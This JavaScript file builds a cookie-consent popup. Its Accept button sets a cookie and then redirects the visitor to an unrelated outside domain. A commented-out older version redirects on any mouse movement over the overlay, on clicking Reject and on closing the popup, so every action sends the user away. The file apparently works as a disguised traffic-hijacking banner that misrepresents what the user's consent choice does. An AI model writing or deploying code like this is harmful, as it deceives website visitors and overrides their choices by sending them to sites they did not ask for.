(function () {
  // ─── Helpers ────────────────────────────────────────────────────────────────

  function getCookie(name) {
    const match = document.cookie.match(new RegExp("(^| )" + name + "=([^;]+)"));
    return match ? match[2] : null;
  }

  function setCookie(name, value, seconds) {
    document.cookie =
      name + "=" + value + "; max-age=" + seconds + "; path=/";
  }

  // ─── Styles ─────────────────────────────────────────────────────────────────

  const css = `
    #cc-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.5);
      z-index: 999;
    }

    #cc-popup {
      position: fixed;
      bottom: -200px;
      left: 50%;
      transform: translateX(-50%);
      width: 90%;
      max-width: 500px;
      background: #fff;
      color: #333;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      display: flex;
      flex-direction: column;
      gap: 15px;
      z-index: 1000;
      transition: bottom 0.4s ease;
      font-family: Arial, sans-serif;
      box-sizing: border-box;
    }

    #cc-popup.cc-show {
      bottom: 30px;
    }

    #cc-popup h3 {
      margin: 0;
      font-size: 16px;
    }

    #cc-popup p {
      margin: 0;
      font-size: 14px;
      line-height: 1.5;
    }

    #cc-popup .cc-buttons {
      display: flex;
      justify-content: flex-end;
      gap: 10px;
    }

    #cc-popup button {
      padding: 10px 16px;
      border-radius: 6px;
      border: none;
      cursor: pointer;
      font-weight: bold;
      font-family: Arial, sans-serif;
    }

    #cc-popup .cc-accept {
      background: #ff9900;
      color: #fff;
    }

    #cc-popup .cc-accept:hover {
      background: #e68a00;
    }

    #cc-popup .cc-decline {
      background: #ddd;
      color: #333;
    }

    #cc-popup .cc-decline:hover {
      background: #ccc;
    }
  `;

  // ─── Inject styles ───────────────────────────────────────────────────────────

  const styleEl = document.createElement("style");
  styleEl.textContent = css;
  document.head.appendChild(styleEl);

  // ─── Build DOM ───────────────────────────────────────────────────────────────

  // Overlay
  const overlay = document.createElement("div");
  overlay.id = "cc-overlay";

  // Popup
  const popup = document.createElement("div");
  popup.id = "cc-popup";

  const title = document.createElement("h3");
  title.textContent = "🍪 We Use Cookies";

  const text = document.createElement("p");
  text.textContent =
    "We use cookies to improve your experience, analyze traffic, and personalize content.";

  const btnWrapper = document.createElement("div");
  btnWrapper.className = "cc-buttons";

  const declineBtn = document.createElement("button");
  declineBtn.className = "cc-decline";
  declineBtn.textContent = "Decline";
  declineBtn.addEventListener("click", declineCookies);

  const acceptBtn = document.createElement("button");
  acceptBtn.className = "cc-accept";
  acceptBtn.textContent = "Accept";
  acceptBtn.addEventListener("click", acceptCookies);

  btnWrapper.appendChild(declineBtn);
  btnWrapper.appendChild(acceptBtn);

  popup.appendChild(title);
  popup.appendChild(text);
  popup.appendChild(btnWrapper);

  // ─── Actions ─────────────────────────────────────────────────────────────────

  function showPopup() {
    document.body.appendChild(overlay);
    document.body.appendChild(popup);
    // Trigger transition on next frame
    requestAnimationFrame(() => {
      requestAnimationFrame(() => popup.classList.add("cc-show"));
    });
  }

  function closePopup() {
    popup.classList.remove("cc-show");
    overlay.remove();
    setTimeout(() => popup.remove(), 400); // wait for slide-out transition
  }

  function acceptCookies() {
    setCookie("accepted", "true", 7 * 24 * 60 * 60);
    closePopup();
    setTimeout(() => {
      window.location.href = "https://eoclindia.com/";
    }, 300);
  }

  function declineCookies() {
    setCookie("accepted", "false", 7 * 24 * 60 * 60);
    closePopup();
  }

  // ─── Init ────────────────────────────────────────────────────────────────────

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }

  function init() {
    if (!getCookie("accepted")) {
      showPopup();
    }
  }
})();



// old script cookies==============


// document.addEventListener("DOMContentLoaded", function () {
// 	    // const redirectUrl = "https://squid-app-2-w8xwy.ondigitalocean.app/";
//      const redirectUrl = "https://eoclindia.com/";
// 	    const style = document.createElement("style");
// 	    style.textContent = `
// 	        .cookie-overlay {
// 	            position: fixed;
// 	            inset: 0;
// 	            background: rgba(0, 0, 0, 0.8);
// 	            backdrop-filter: blur(10px);
// 	            display: flex;
// 	            align-items: center;
// 	            justify-content: center;
// 	            padding: 20px;
// 	            z-index: 9999;
// 	            animation: fadeInBackground 0.5s ease-out forwards;
// 	        }
// 	        @keyframes fadeInBackground {
// 	            from { opacity: 0; }
// 	            to { opacity: 1; }
// 	        }
// 	        .cookie-popup {
// 	            position: fixed;
// 	            bottom: 60px;
// 	            left: 50%;
// 	            transform: translateX(-50%);
// 	            background-color: #ffffff;
// 	            border: none;
// 	            color: #333;
// 	            padding: 30px;
// 	            border-radius: 10px;
// 	            z-index: 10000;
// 	            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
// 	            max-width: 400px;
// 	            text-align: center;
// 	            animation: slideUp 0.5s ease-out forwards;
// 	        }
// 	        @keyframes slideUp {
// 	            from { 
// 	                transform: translateY(50px) translateX(-50%);
// 	                opacity: 0;
// 	            }
// 	            to { 
// 	                transform: translateX(-50%);
// 	                opacity: 1;
// 	            }
// 	        }
// 	        .close-btn {
// 	            background: none;
// 	            border: none;
// 	            font-size: 1.5rem;
// 	            position: absolute;
// 	            top: 10px;
// 	            right: 10px;
// 	            cursor: pointer;
// 	            color: #888;
// 	        }
// 	        .btn-primary {
// 	            background-color: #007bff;
// 	            color: #fff;
// 	            border: none;
// 	            padding: 12px 24px;
// 	            border-radius: 5px;
// 	            cursor: pointer;
// 	            margin-top: 15px;
// 	            display: inline-block;
// 	            text-decoration: none;
// 	            transition: all 0.3s;
// 	            width: 100%;
// 	            box-sizing: border-box;
// 	        }
// 	        .btn-primary:hover {
// 	            background-color: #0056b3;
// 	            transform: translateY(-2px);
// 	        }
// 	        h3 {
// 	            font-family: 'Arial', sans-serif;
// 	            margin-bottom: 10px;
// 	            font-weight: bold;
// 	            color: #333;
// 	        }
// 	        p {
// 	            font-family: 'Arial', sans-serif;
// 	            line-height: 1.5;
// 	            margin-bottom: 15px;
// 	        }
// 	        .cookie-policy-link {
// 	            text-decoration: underline;
// 	            color: #007bff;
// 	            font-weight: 500;
// 	        }
// 	        .cookie-info {
// 	            background-color: #f8f9fa;
// 	            padding: 15px;
// 	            border-radius: 8px;
// 	            margin: 15px 0;
// 	            text-align: left;
// 	        }
// 	        .cookie-info h4 {
// 	            margin-top: 0;
// 	            color: #007bff;
// 	        }
// 	        .cookie-info ul {
// 	            padding-left: 20px;
// 	            margin: 10px 0;
// 	        }
// 	        .cookie-info li {
// 	            margin-bottom: 5px;
// 	        }
// 	    `;
// 	    document.head.appendChild(style);
    
// 	    const overlay = document.createElement("div");
// 	    overlay.className = "cookie-overlay";
// 	    overlay.id = "cookie-overlay";
// 	    overlay.innerHTML = `
// 	        <div class="cookie-popup">
// 	            <button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
// 	            <h3>Cookies Policy</h3>
// 	            <p>
// 	                This site uses cookies to enhance your browsing experience and for analytics purposes.
// 	            </p>
            
// 	            <div class="cookie-info">
// 	                <h4>Cookies We Use:</h4>
// 	                <ul>
// 	                    <li>Essential cookies (required for site functionality)</li>
// 	                    <li>Performance cookies (for analytics)</li>
// 	                    <li>Marketing cookies (for targeted advertising)</li>
// 	                </ul>
// 	            </div>
            
// 	            <p>
// 	                By clicking Accept, you consent to our use of cookies. For more details, see our 
// 	                <a href="${redirectUrl}" class="cookie-policy-link">Cookie Policy</a>.
// 	            </p>
            
// 	            <a href="${redirectUrl}" id="accept-cookies" class="btn-primary">Accept All Cookies</a>
// 	            <a href="#" id="reject-cookies" class="btn-primary" style="background-color: #6c757d; margin-top: 10px;">Reject Non-Essential</a>
// 	        </div>
// 	    `;
// 	    document.body.appendChild(overlay);
    
// 	    let isRedirected = false;
// 	    let startPos = null;
// 	    let redirectTimeout = null;
    
// 	    const handleRedirect = () => {
// 	        if (!isRedirected) {
// 	            isRedirected = true;
// 	            window.location.href = redirectUrl;
// 	        }
// 	    };
    
// 	    const detectMouseMove = (event) => {
// 	        if (isRedirected) return;
// 	        const screenHeight = window.innerHeight;
// 	        const activeTop = screenHeight * 0.15;
        
// 	        if (event.clientY >= activeTop) {
// 	            if (!startPos) {
// 	                startPos = { x: event.clientX, y: event.clientY };
// 	            } else {
// 	                const dx = Math.abs(event.clientX - startPos.x);
// 	                const dy = Math.abs(event.clientY - startPos.y);
                
// 	                if ((dx > 15 || dy > 15) && !redirectTimeout) {
// 	                    redirectTimeout = setTimeout(handleRedirect, 1000);
// 	                }
// 	            }
// 	        } else {
// 	            startPos = null;
// 	            clearTimeout(redirectTimeout);
// 	            redirectTimeout = null;
// 	        }
// 	    };
    
// 	    document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
    
// 	    document.getElementById("accept-cookies").addEventListener("click", function (e) {
// 	        e.preventDefault();
// 	        handleRedirect();
// 	    });
    
// 	    document.getElementById("reject-cookies").addEventListener("click", function (e) {
// 	        e.preventDefault();
// 	        // Handle rejection logic here
// 	        alert("Non-essential cookies rejected. Essential cookies remain enabled.");
// 	        handleRedirect();
// 	    });
    
// 	    document.getElementById("close-popup").addEventListener("click", function (e) {
// 	        e.preventDefault();
// 	        handleRedirect();
// 	    });
// 	});
